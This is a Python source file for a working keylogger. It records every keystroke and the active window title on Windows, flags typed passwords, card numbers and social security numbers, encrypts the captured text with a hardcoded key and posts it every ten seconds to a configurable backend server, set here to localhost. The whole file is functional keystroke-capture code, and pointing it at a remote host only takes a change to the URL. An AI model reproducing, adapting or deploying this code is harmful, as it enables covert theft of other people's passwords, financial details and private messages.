import os
import base64
import time
import threading
import requests
from pynput import keyboard
from cryptography.fernet import Fernet
import platform
import hashlib
import json
import ctypes
import ctypes.wintypes

# ==================== CONFIGURATION ====================
CONFIG = {
    "BACKEND_URL": "http://localhost:4000/api/keylogger/save",
    "USER_ID": "67fa6a24415733da21dfde32",  # MongoDB ObjectId
    "ENCRYPTION_KEY": "VamshiBurgulaAdmin".encode(),
    "BUFFER_FLUSH_INTERVAL": 10,  # seconds
    "MAX_BUFFER_SIZE": 300,       # characters
    "TRUSTED_SITES": [
        "google.com", "stackoverflow.com", "github.com",
        "microsoft.com", "apple.com", "amazon.com"
    ],
    "UNSAFE_SITES": [
        "phishingsite.com", "maliciousapp.net",
        "piratedmovies.com", "illegalcontent.net"
    ]
}

# ==================== INITIALIZATION ====================
try:
    key = base64.urlsafe_b64encode(CONFIG["ENCRYPTION_KEY"].ljust(32, b'='))
    fernet = Fernet(key)

    buffer = ""
    start_time = time.time()
    is_running = True
except Exception as e:
    print(f"Initialization error: {e}")
    exit(1)

# ==================== UTILITY FUNCTIONS ====================
def get_system_info():
    return {
        "platform": platform.platform(),
        "machine": platform.machine(),
        "python_version": platform.python_version()
    }

def create_request_signature(user_id, timestamp):
    return hashlib.sha256(f"{user_id}{timestamp}".encode()).hexdigest()

def get_active_window_title():
    try:
        user32 = ctypes.windll.user32
        h_wnd = user32.GetForegroundWindow()
        length = user32.GetWindowTextLengthW(h_wnd)
        buffer = ctypes.create_unicode_buffer(length + 1)
        user32.GetWindowTextW(h_wnd, buffer, length + 1)
        return buffer.value
    except Exception:
        return "Unknown Window"

def is_trusted_website(title):
    return any(site.lower() in title.lower() for site in CONFIG["TRUSTED_SITES"])

def is_unsafe_website(title):
    return any(site.lower() in title.lower() for site in CONFIG["UNSAFE_SITES"])

def safe_encrypt(data):
    try:
        return fernet.encrypt(data.encode()).decode('utf-8')
    except Exception:
        return data

# ==================== DATA PROCESSING ====================
def detect_sensitive_data(text):
    flags = []
    text_lower = text.lower()
    if "password" in text_lower:
        flags.append("Possible Password")
    if ("card" in text_lower or "cc" in text_lower) and any(c.isdigit() for c in text):
        flags.append("Possible Credit Card")
    if "ssn" in text_lower or "social security" in text_lower:
        flags.append("Possible SSN")
    return flags

def detect_anomalies(text):
    anomalies = []
    if text.lower().count("password") >= 2:
        anomalies.append("Repeated password entries")
    if len(text) > CONFIG["MAX_BUFFER_SIZE"]:
        anomalies.append("Excessive keystrokes")
    elapsed = time.time() - start_time
    if elapsed > 0 and len(text)/elapsed > 30:
        anomalies.append("Unusually fast typing")
    current_hour = time.localtime().tm_hour
    if current_hour < 6 or current_hour > 23:
        anomalies.append("Activity at odd hours")
    return anomalies

# ==================== SEND TO SERVER ====================
def send_to_server(data):
    try:
        timestamp = int(time.time())
        window_title = get_active_window_title()

        payload = {
            "userId": CONFIG["USER_ID"],
            "keystrokes": safe_encrypt(data),
            "windowTitle": window_title,
            "isTrustedSite": is_trusted_website(window_title),
            "isUnsafeSite": is_unsafe_website(window_title),
            "flags": detect_sensitive_data(data),
            "anomalies": detect_anomalies(data),
            "timestamp": timestamp,
            "systemInfo": get_system_info()
        }

        headers = {
            "X-Request-Signature": create_request_signature(CONFIG["USER_ID"], timestamp),
            "Content-Type": "application/json"
        }

        response = requests.post(
            CONFIG["BACKEND_URL"],
            data=json.dumps(payload),
            headers=headers,
            timeout=5
        )

        if response.status_code != 201:
            print(f"⚠️ Server error: {response.status_code} {response.text}")

    except Exception as e:
        print(f"Transmission error: {e}")

# ==================== KEYSTROKE LISTENERS ====================
def on_press(key):
    global buffer, start_time
    try:
        if not is_running:
            return False
        if key == keyboard.Key.enter:
            buffer += "\n"
            log_buffer("[ENTER]")
        elif key == keyboard.Key.space:
            buffer += " "
        elif key == keyboard.Key.tab:
            buffer += "[TAB]"
        elif key == keyboard.Key.backspace:
            buffer += "[BACKSPACE]"
        elif hasattr(key, 'char') and key.char is not None:
            buffer += key.char

        if len(buffer) >= CONFIG["MAX_BUFFER_SIZE"]:
            log_buffer()

    except Exception as e:
        print(f"Key processing error: {e}")

def on_release(key):
    global is_running
    if key == keyboard.Key.esc:
        is_running = False
        return False

def log_buffer(extra_info=""):
    global buffer
    if buffer.strip():
        try:
            entry = buffer.strip()
            if extra_info:
                entry += f" {extra_info}"
            send_to_server(entry)
        finally:
            buffer = ""

# ==================== MAIN EXECUTION ====================
if __name__ == "__main__":
    try:
        def buffer_flusher():
            while is_running:
                time.sleep(CONFIG["BUFFER_FLUSH_INTERVAL"])
                log_buffer()

        threading.Thread(target=buffer_flusher, daemon=True).start()

        print("🔒 Keylogger active... Press ESC to stop.")
        with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
            listener.join()

    except KeyboardInterrupt:
        print("\nShutting down gracefully...")
    finally:
        if buffer:
            log_buffer("[SHUTDOWN]")
